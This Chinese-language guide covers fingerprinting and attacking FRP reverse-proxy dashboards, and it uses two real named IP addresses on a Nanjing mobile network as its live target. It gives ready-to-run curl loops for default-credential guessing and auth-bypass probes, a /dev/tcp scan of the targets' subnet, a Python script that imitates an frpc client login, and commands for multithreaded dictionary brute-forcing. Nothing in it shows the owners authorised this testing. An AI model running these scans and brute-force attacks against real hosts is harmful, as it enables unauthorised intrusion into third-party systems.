# FRP (Fast Reverse Proxy) 服务器识别与信息收集

> 实战案例：223.109.241.55 / 223.109.241.56 — 双节点 FRP 集群
> 背景：移动云江苏南京 / AS56046 / 无空间搜索引擎记录（Quake/Shodan 均无）

---

## 一、FRP 架构识别特征

### 1.1 端口特征

| 端口 | 用途 | 说明 |
|------|------|------|
| 8080 | Dashboard (Vue 3 SPA) | 管理面板，标题通常为「管理后台」 |
| 7758 | 业务流量端口 | TLS 自定义二进制协议，非 HTTP |
| 22022 | SSH | 系统管理（非标端口，Ubuntu） |
| 7000/7400/7500 | FRP 默认端口 | 通常关闭或改端口 |

### 1.2 Dashboard 页面特征

```html
<!-- FRP Dashboard index.html 特征 -->
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>管理后台</title>
    <script type="module" crossorigin src="./assets/index-XXXX.js"></script>
    <link rel="stylesheet" crossorigin href="./assets/index-XXXX.css">
  </head>
  <body>
    <div id="app"></div>
  </body>
</html>
```

- **Vue 3 + Vite 构建**（`type="module" crossorigin` + hash 文件名）
- **标题固定为「管理后台」**（不同部署均相同）
- **js 文件约 1.2MB**（ECharts 图表库 + 管理逻辑）
- **无 webpack chunk-vendors 模式**（Vite 产物不同）

### 1.3 Cookie 特征

```
Set-Cookie: frp_mgr_session=; Path=/; Max-Age=0; HttpOnly
```

cookie 名称固定为 `frp_mgr_session`，是 FRP Dashboard 的独有特征。

### 1.4 API 端点特征

发现以下 API 端点几乎可以确定是 FRP：

```
# 认证（入口）
POST /api/auth/login        Body: {username, password}    → 401/200
POST /api/auth/logout       → {"status":"ok"} (无需认证)
GET  /api/auth/me           → "unauthorized" 或用户信息

# 仪表盘（需认证）
GET  /api/dashboard/summary
GET  /api/dashboard/bandwidth
GET  /api/dashboard/daily?days=N
GET  /api/dashboard/disk
GET  /api/dashboard/history?hours=N
GET  /api/dashboard/nginx
GET  /api/dashboard/regions
GET  /api/dashboard/servers

# 代理节点（需认证）
GET  /api/proxies?params
GET  /api/proxies/test?proxy=xxx

# 业务密钥（需认证）
GET    /api/keys
POST   /api/keys              Body: {name}
DELETE /api/keys?name=xxx

# 白名单（需认证）
GET    /api/whitelist
POST   /api/whitelist         Body: {ip, ttl}
DELETE /api/whitelist?ip=xxx

# 系统
POST /api/cleanup/trigger
```

### 1.5 前端路由

```
/           → 总览/仪表盘
/login      → 登录页
/proxies    → 节点列表
/keys       → 业务密钥管理
/whitelist  → IP 白名单
/history    → 历史记录
```

### 1.6 后端特征

- **纯文本响应**，非 JSON（`"invalid credentials"`、`"unauthorized"`）
- **Go 语言编写**（fatedier/frp 项目）
- **null 字节注入 `%00` 返回 500** → Go panic 确认
- **X-Content-Type-Options: nosniff** → Go net/http 默认行为
- **Session 认证**（`withCredentials: true`），非 JWT/Token 认证
- **`Content-Type: application/json` 唯一支持**（`x-www-form-urlencoded` 返回 400）

---

## 二、FRP 版本识别

### 2.1 通过 JS 特征推断

不同 FRP 版本的 dashboard 实现有差异：

| FRP 版本 | Dashboard 实现 | API 前缀 | 特征 |
|----------|---------------|----------|------|
| < 0.52 | Vue 2 + Webpack | `/api/` | chunk-vendors 模式 |
| >= 0.52 | Vue 3 + Vite | `/api/` | `type="module"`, 无 chunk-vendors |
| 最新 (0.61+) | Vue 3 + Vite | `/api/` | 新增 `/api/v1/` 前缀 |

### 2.2 查看 `/assets/` 目录列取

FRP Vite 构建产物有多份 JS 文件（不同部署时产生的不同 hash 版本）：

```bash
curl -sk --connect-timeout 5 "http://target:8080/assets/" 
# nginx autoindex 会列出所有文件：
#   index-BdEkOaE1.js    ← 当前引用的版本 (1.2MB)
#   index-BFnrSEZW.js    ← 旧构建版本
#   index-Bd2A64Lm.js    ← 更旧的版本
#   ...
```

所有版本 JS 内容基本相同（同一源代码的不同 hash 输出），无隐藏 API。

### 2.3 Dashboard 自动刷新间隔

```javascript
// 从 JS 中提取
setInterval(b, 30000)  // 仪表盘部分数据每 30s 刷新
setInterval(S, 5000)   // 部分指标每 5s 刷新
```

---

## 三、认证绕过测试清单

### 3.1 系统化测试流程

```bash
# 1. 测试所有已知端点的未授权访问
for endpoint in ...; do
  for method in GET POST; do
    curl -sk ... "http://target:8080/api${endpoint}"
  done
done

# 2. 测试默认凭据
for u in admin frp frps fatedier root; do
  for p in admin frp frps 123456 admin123 fatedier; do
    curl -sk -X POST "http://target:8080/api/auth/login" \
      -H "Content-Type: application/json" \
      -d "{\"username\":\"$u\",\"password\":\"$p\"}"
  done
done

# 3. 测试其他 HTTP 方法
for method in HEAD OPTIONS TRACE PUT PATCH DELETE; do
  curl -sk -X $method "http://target:8080/api/dashboard/summary"
done

# 4. 测试 JSON 参数注入
# 尝试各种畸形的 JSON 体
# 如 admin:true, role:admin, token:admin, session:admin 等

# 5. 测试 API Key 头
for key in admin default test; do
  for header in "X-API-Key" "X-Api-Key" "X-Token" "Token" "Authorization"; do
    curl -sk -H "${header}: ${key}" "http://target:8080/api/dashboard/summary"
  done
done

# 6. 测试路径遍历
# 如 ../auth/me, //auth/me, auth/me%00, auth/me%20 等

# 7. 测试 CORS 配置
curl -sk -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  "http://target:8080/api/auth/login"
```

### 3.2 预期结果

```
401 "invalid credentials"     → 认证正常，密码错误
401 "unauthorized"            → 需要登录
400 "bad request"             → 请求格式错误
405 Method Not Allowed        → 方法不支持
200 OK                        → ✅ 发现未授权访问
000 (connection closed)       → 连接中断，可能是限速或特殊处理
500 Internal Server Error     → 触发后端异常（如 null 字节）
```

---

## 四、FRP 协议端口探测（7758）

### 4.1 端口特征

```
- TCP 端口，对外 TLS 加密
- 非 HTTP 协议（发送 HTTP GET 无响应）
- 接受原始 TCP 连接 + TLS 握手
- 自签名证书（Subject/Issuer 均为空，2048-bit RSA）
- 不响应 HTTP、WebSocket、SSH、FTP 等标准协议
```

### 4.2 模拟 frpc 连接

```python
import socket, ssl, struct, json, time

HOST = 'target_ip'
PORT = 7758

# FRP Login 消息结构（来自 frp 源码）
msg = {
    'version': '0.61.2',
    'hostname': 'test',
    'os': 'linux',
    'arch': 'amd64',
    'user': '',
    'token': '',  # 需要有效的 token
    'timestamp': int(time.time()),
    'privilege_key': '',
    'run_id': 'test123',
    'pool_count': 1,
}

msg_json = json.dumps(msg)
body = struct.pack('!I', len(msg_json)) + msg_json.encode()

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
sock = socket.create_connection((HOST, PORT), timeout=5)
ssock = ctx.wrap_socket(sock, server_hostname=HOST)
ssock.sendall(body)
resp = ssock.recv(4096)
```

> **注意：** 未授权的 frpc 连接会超时无响应。需要先在 dashboard 的 `/api/keys` 中创建 token 才能连接。

---

## 五、多节点发现

FRP 集群通常部署多台节点，使用同网段 IP：

```bash
# 快速扫描同网段
for i in $(seq 0 255); do
  ip="223.109.241.$i"
  timeout 2 bash -c "echo -n '' > /dev/tcp/$ip/8080" 2>/dev/null && echo "$ip:8080 OPEN"
  timeout 2 bash -c "echo -n '' > /dev/tcp/$ip/7758" 2>/dev/null && echo "$ip:7758 OPEN"
  timeout 2 bash -c "echo -n '' > /dev/tcp/$ip/22022" 2>/dev/null && echo "$ip:22022 OPEN"
done
```

多节点特征：
- 完全相同的 index.html（同一 hash 的 JS 文件）
- 相同的 API 行为
- 相同的 Cookie 名称 `frp_mgr_session`
- 可能共享 session 或独立认证

---

## 六、与同类系统的区分

| 系统 | 区别特征 |
|------|---------|
| **FRP** | `frp_mgr_session` cookie, `/api/keys`, `/api/whitelist`, `/api/proxies/test` |
| **nps** | `nps_auth_key` cookie, `/login/index`, Go 后端 |
| **ngrok** | 无此形式的 dashboard，不同 API 模式 |
| **frpc-desktop** | Electron 客户端，非 Web 面板 |
| **自建反向代理面板** | 无 `/api/keys` 或 `/api/whitelist` 端点 |

---

## 七、实战案例参考

> **目标：** 223.109.241.56 (南京移动 AS56046)
> **端口：** 8080 (Dashboard) + 7758 (Traffic) + 22022 (SSH) + 7732 (备用 nginx)
> **技术栈：** Vue 3 + Vite (前端) + Go/fatedier (frps 后端) + nginx (静态文件服务)
> **安全措施：** 无未授权接口 / 无 CORS / 无 Source Map / 无 .git/.env 泄露 / 无 Vite 开发服务器 / 强密码
> **唯一漏洞：** null 字节注入 `%00` 致 500 (Go panic, 仅 DoS)
> **配置缺陷：** `/assets/` 目录列取开启，暴露历史构建版本（nginx autoindex）

---

## 八、FRP 字典爆破

### 8.1 使用专用脚本

```bash
# 1. 生成 FRP 场景字典 (~6000 个)
python3 scripts/frp_dict_gen.py > /tmp/frp_passwords.txt

# 2. 运行多线程爆破
python3 scripts/frp_brute.py http://target:8080 admin /tmp/frp_passwords.txt
```

### 8.2 预期

- 每次请求耗时约 0.2s (5 并发 ≈ 25 req/s)
- 5768 个密码约需 3-4 分钟
- 如果快速通过 → 密码在字典中
- 如果跑完仍不中 → 强密码，不在通用字典中

### 8.3 密码强弱的判断

| 结果 | 含义 |
|------|------|
| 4000+ 个后仍全 401 | 🔴 强密码，不在任何常见字典中 |
| 少数几个返回 000 | 可能是限速或连接问题，非成功标志 |
| 返回非 401 状态码 | ✅ 可能找到了！需手动验证 |
